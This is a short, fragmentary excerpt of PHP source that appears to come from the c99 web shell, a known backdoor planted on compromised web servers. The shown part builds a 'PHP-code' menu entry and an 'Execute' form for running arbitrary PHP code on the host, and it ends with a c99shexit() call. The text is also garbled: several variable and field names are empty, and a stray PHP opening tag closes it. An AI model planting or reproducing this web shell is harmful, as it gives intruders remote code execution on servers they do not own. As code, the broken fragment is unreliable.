...
$quicklaunch = array(
 ...
 array("<b>PHP-code</b>","#\" onclick=\"document.todo.act.value='';document.todo.d.value='%d';document.todo.submit();"),
...
if ($act == "")
{
 ...
 else {echo "<b>Execution PHP-code</b>"; if (empty($_txt)) {$_txt = TRUE;}}
 echo "<form method=POST><input type=hidden name=act value=><textarea name=\"\" cols=\"122\" rows=\"10\">".htmlspecialchars($)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"_txt\" value=\"1\""; if ($_txt) {echo " checked";} echo "></form>";
}
if ($act == "f")
{
...
</body></html><?php chdir($lastdir); c99shexit(); ?><?PHP 
